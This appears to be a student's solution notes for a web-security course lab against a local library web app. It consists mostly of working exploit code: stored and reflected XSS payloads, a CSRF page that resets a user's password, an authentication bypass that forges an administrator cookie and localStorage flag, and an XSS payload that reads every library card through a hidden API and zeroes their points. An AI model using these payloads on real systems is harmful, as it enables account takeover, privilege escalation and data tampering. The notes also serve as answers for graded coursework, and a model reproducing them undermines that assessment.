# JavaScript
```JavaScript
# Write to console
console.log(<Variable>);

# Get an element from the page
var <Variable> = document.GetElementById("<ID>");
var <Variable> = document.GetElementByName("<Name>");

# Get content from a page
fetchServerContent("<URL>");

# Events
document.addEventListener('click', (event) => {
  event.preventDefault();
});

# Change to a different location
location.href = '/<URI>';

# Post
var payload = "document.cookie='Role-Identifier=Administrator; path=/'; localStorage.setItem('isAdmin', '1'); location.href='http://localhost:7149/admin';";
fetch("http://localhost:7149/admin/debug-test?DebugTest=<script>" + encodeURIComponent(payload) + "<script>", {method: "POST"});
```

# XSS Payload (Stored)
```JavaScript
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Flag2</title>
  </head>
  <body>
    <script>
      // Fetch the API page and POST
      fetch("http://localhost:7149/api/review/6", {
        method: "POST",
        headers: {
          // Important to ensure correct content-type
          "Content-Type": "application/json",
          Accept: "*/*"
        },
        // Build JSON payload
        body: JSON.stringify({
          title: "Echo found in stack trace: possibly edible.",
          reviewer: "904160213",
          // XSS payload
          body: "<img src=x onerror=\"document.querySelector('h5').innerText=document.cookie\">",
          rating: 5,
          recommended: true,
          bookId: "6"
        })
      }).then(() => {
        // Redirect only after post
        window.location.href = "http://localhost:7149/book/6";
      });
    </script>
  </body>
</html>
```

# XSS Payload (Reflective)
```JavaScript
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Flag 3</title>
</head>
<body>
    // Makes a get request to the URI
    <form id="searchForm" method="GET" action="http://localhost:7149/search">
            // Fills the form with the payload text
            <input type="text" name="search" value="<img src=x onerror='alert(&quot;CS6035&quot;)'>">
    </form>
    <script>
            // Wait for the window to load and set a timeout of 1 second before submitting the form
            window.onload = function() {
                    setTimeout(function() {
                            document.getElementById('searchForm').submit();
                    }, 1000);
            };
    </script>
</body>
</html>
```

# CSRF Payload
```JavaScript
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Flag 4</title>
</head>
// Loads document and submits form
<body onload=document.forms[0].submit()>
  // Utilizes action to load a specific page, such as reset-password
  <form action="http://localhost:7149/api/profile/reset-password" method="POST">
        <input type="hidden" name="password" value="DeadDrop99">
        <input type="hidden" name="gtId" value="904160213">
        <input type="hidden" name="funNumber" value="2025">
        <input type="hidden" name="randomNumber" value="72662">
        <input type="hidden" name="__RequestVerificationToken" value="84508">
  </form>
</body>
</html>
```
```
# To get the randomNumber and __ResetVerificationToken above, run in console
var pair = window.generateRequestVerificationToken('904160213', 'DeadDrop99');
console.log(pair);
# Hardcode into form...doesn't change
```

# Authentication Bypass
```JavaScript
# Checks
console.log('document.cookie =', document.cookie);
console.log('localStorage.isAdmin =', localStorage.getItem('isAdmin'));
console.log('localStorage keys =', Object.keys(localStorage));
document.cookie = "Role-Identifier=Administrator; path=/";

# Try changing localStorage
// Try string 'true'
localStorage.setItem('isAdmin', 'true');
// or try numeric '1' if that was used
localStorage.setItem('isAdmin', '1');

// Verify:
console.log('now isAdmin =', localStorage.getItem('isAdmin'));

// then open admin page in same tab:
location.href = '/admin';

# Change cookie role
// set Role-Identifier to 'Administrator' (path=/ so it applies everywhere)
document.cookie = "Role-Identifier=Administrator; path=/";
// verify
console.log(document.cookie);

location.href = '/admin';

# One-liner
localStorage.setItem('isAdmin','true'); document.cookie = "Role-Identifier=Administrator; path=/"; console.log('done'); location.href='/admin';

# Final exploit
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Flag5</title></head>
<body onload=document.forms[0].submit()>
  <form id="f" method="POST" action="http://localhost:7149/admin/debug-test?DebugTest=<script>document.cookie='Role-Identifier=Administrator; path=/'; location.href='/admin';</script>">
  </form>
  <script>
    document.getElementById("f").submit();
  </script>
</body>
</html>
```

# Read hidden API for ID Cards then use XSS to modify values with by -1 incrementing
```JavaScript
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Flag 8</title>
</head>
<body>
  <form id="searchForm" method="GET" action="http://localhost:7149/search">
    <input type="text" name="search"
      value="<img src=x onerror='(async function(){try{const r=await fetch(&quot;/api/libraryCard/list-all&quot;,{credentials:&quot;include&quot;});const arr=await r.json();const ids=arr.map(function(o){return o.libraryCard}).join(&quot;,&quot;);const pts=arr.map(function(o){return -Math.abs(o.points)}).join(&quot;,&quot;);await fetch(&quot;/api/libraryCard/redeem/batch?libraryCards=&quot;+ids+&quot;&amp;points=&quot;+pts,{method:&quot;GET&quot;,credentials:&quot;include&quot;});window.location.href=&quot;/libraryCard&quot;;}catch(e){console.error(e);window.location.href=&quot;/libraryCard&quot;;}})()'>"/>
  </form>

  <script>
    window.addEventListener('load', function () {
      setTimeout(function () {
        document.getElementById('searchForm').submit();
      }, 250);
    });
  </script>
</body>
</html>
```
